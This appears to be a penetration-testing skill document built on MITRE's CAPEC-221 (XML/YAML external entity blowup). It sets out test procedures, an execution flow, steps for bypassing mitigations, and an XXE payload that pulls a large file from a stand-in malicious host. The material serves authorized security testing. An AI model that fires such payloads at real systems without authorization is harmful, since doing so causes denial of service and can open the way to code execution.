# CAPEC-221: Data Serialization External Entities Blowup

- Catalog: [CAPEC-221](https://capec.mitre.org/data/definitions/221.html)
- Abstraction: Detailed · Status: Draft
- Likelihood of attack: not stated · Typical severity: not stated
- CAPEC list: 3.9

## Attack pattern

This attack takes advantage of the entity replacement property of certain data serialization languages (e.g., XML, YAML, etc.) where the value of the replacement is a URI. A well-crafted file could have the entity refer to a URI that consumes a large amount of resources to create a denial of service condition. This can cause the system to either freeze, crash, or execute arbitrary code depending on the URI.

## Exhaustive test law

This is a detailed pattern. Execute every listed technique in the execution flow, then mutate encodings/roles/verbs. Also run the parent Standard/Meta patterns.

A scanner hit or a single blocked request is inventory, not a CAPEC-221 test. Complete means every in-scope instance finished the execution flow (or was ruled out with saved evidence) **and** every related CWE procedure was run or dated N/A.

## Tooling (PWN)

PWN::Plugins::OpenAPI, crafted XML via RestClient / TransparentBrowser

## Procedure

1. **Applicability gate.** Check prerequisites and skills below. If the target cannot satisfy them, record `CAPEC-221 N/A: <reason>` and stop.
2. **Instance inventory.** List every actor/path/API/host where this pattern can run (anonymous, low-priv, high-priv, adjacent network, local). One URL is not an inventory.
3. **Oracle.** From consequences, define pass/fail (auth bypass, data out, crash, persistence, etc.).
4. **Execute the flow.** Run every Explore → Experiment → Exploit step and every listed technique. Persist request/response, pcap, or debugger output under `/tmp` or the engagement dir and **re-read** it.
5. **Mutate.** Encoding, method, role, content-type, timing, second-order, chained related CAPECs. Do not stop at the first WAF 403.
6. **Mitigation negation.** For each mitigation, retry the flow with the control on and bypassed. Unchanged oracle = control failed.
7. **CWE close-out.** Open each related `cwe` skill file (`../cwe/references/CWE-<id>.md`) and run that exhaustive CWE procedure. CAPEC without CWE is a technique note, not a weakness finding.
8. **Report.** Cite `CAPEC-221`, related CWE IDs, instance, oracle, evidence path.

## Execution flow (minimum techniques)

- Step 1 (Explore): [Find target web service] The adversary must first find a web service that takes input data in the form of a serialized language such as XML or YAML.
- Step 2 (Experiment): [Host malicious file on a server] The adversary will create a web server that contains a malicious file. This file will be extremely large, so that if a web service were to try to load it, the service would most likely hang.
- Step 2 (Experiment): [Craft malicious data] Using the serialization language that the web service takes as input, the adversary will craft data that links to the malicious file using an external entity reference to the URL of the file.
- Step 4 (Exploit): [Send serialized data containing URI] The adversary will send specially crafted serialized data to the web service. When the web service loads the input, it will attempt to download the malicious file. Depending on the amount of memory the web service has, this could either crash the service or cause it to hang, resulting in a Denial of Service attack.

## Prerequisites

- A server that has an implementation that accepts entities containing URI values.

## Skills required

- (none listed in CAPEC catalog)

## Resources required

- (none listed in CAPEC catalog)

## Oracles (consequences)

- Availability: Resource Consumption
- Confidentiality, Integrity, Availability: Execute Unauthorized Commands — Run Arbitrary Code

## Mitigations to bypass

- This attack may be mitigated by tweaking the XML parser to not resolve external entities. If external entities are needed, then implement a custom XmlResolver that has a request timeout, data retrieval limit, and restrict resources it can retrieve locally.
- This attack may be mitigated by tweaking the serialized data parser to not resolve external entities. If external entities are needed, then implement a custom resolver that has a request timeout, data retrieval limit, and restrict resources it can retrieve locally.

## Example instances (payload / topology hints)

- In this example, the XML parser parses the attacker's XML and opens the malicious URI where the attacker controls the server and writes a massive amount of data to the response stream. In this example the malicious URI is a large file transfer. <?xml version="1.0"?> < !DOCTYPE bomb [ <!ENTITY detonate SYSTEM "http://www.malicious-badguy.com/myhugefile.exe"> ]> <bomb>&detonate;</bomb>

## Related CAPECs (test these too)

- ChildOf → [CAPEC-231](CAPEC-231.md)
- ChildOf → [CAPEC-278](CAPEC-278.md)

## Related CWEs (run the cwe skill)

- [CWE-611](../cwe/references/CWE-611.md) — run that CWE procedure after this CAPEC flow

## Verification

- [ ] Applicability recorded (in-scope or dated N/A)
- [ ] Instance inventory is more than one guess
- [ ] Every execution-flow step was attempted or marked N/A
- [ ] Evidence artifact path saved and re-read
- [ ] Related CAPECs handled or deferred
- [ ] Related CWE procedures run via `cwe` skill
- [ ] Finding (if any) cites CAPEC-221 and CWE IDs
